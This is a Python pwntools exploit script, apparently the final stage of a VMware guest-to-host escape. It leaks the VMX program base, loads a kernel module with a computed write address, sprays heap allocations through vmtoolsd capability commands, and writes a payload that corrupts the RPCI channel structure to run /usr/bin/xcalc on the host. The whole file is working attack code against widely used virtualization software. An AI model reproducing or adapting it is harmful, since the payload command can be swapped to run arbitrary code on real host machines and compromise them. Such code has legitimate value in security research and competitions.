from pwn import *
import os

# the leak was set up before, so read it out now
context.log_level = 'DEBUG'
p = process(["vmware-rpctool", "ToolsAutoInstallGetParams"])

ret = p.recvall(timeout=0.02)
if len(ret) != 0x45f:
    print "didn't leak!"
    exit(0)
progbase = u64(ret[-7:-1].ljust(8, "\x00")) - 0x179ad0
if progbase % 0x1000 != 0:
    print "didn't leak!"
    exit(0)

# target address
print hex(progbase)

# where to write to get PC
targwrite = progbase + 0x111DF90

# trigger the next stage
with open("./mytoolsd/payload.bin", "wb") as f:
    f.write(cyclic(0x2c8))

os.system("python2 stage2.py")

# tell the kernel module where to write
os.system("cd pwn2; sudo insmod ./pwn3.ko vmxwrite=%s" % str(targwrite))

# we want to spray with our own vmware tools daemon
os.system("cd mytoolsd; sudo ~/open-vm-tools/open-vm-tools/services/vmtoolsd/vmtoolsd")

# pop tcaches
os.system("vmtoolsd --cmd 'vmx.capability.unified_loop 000000010000%04x%s'" % (0, "1"*0x2c0))
os.system("vmtoolsd --cmd 'vmx.capability.unified_loop 000000010000%04x%s'" % (1, "2"*0x2c0))

# write the final payload to smash the RPCI channel structure
with open("./mytoolsd/payload.bin", "wb") as f:
    payload = "RPCI vsock" + "\x00"*0x6 + p64(targwrite) + p64(0xa) + p64(progbase + 0xECFD0) + p64(progbase + 0x111dfe1) + p8(1) + "\x00"*0x20 + "/usr/bin/xcalc\x00"
    payload = payload.ljust(0x2c8, "\x00")

    f.write(payload)

os.system("cd mytoolsd; sudo ~/open-vm-tools/open-vm-tools/services/vmtoolsd/vmtoolsd")
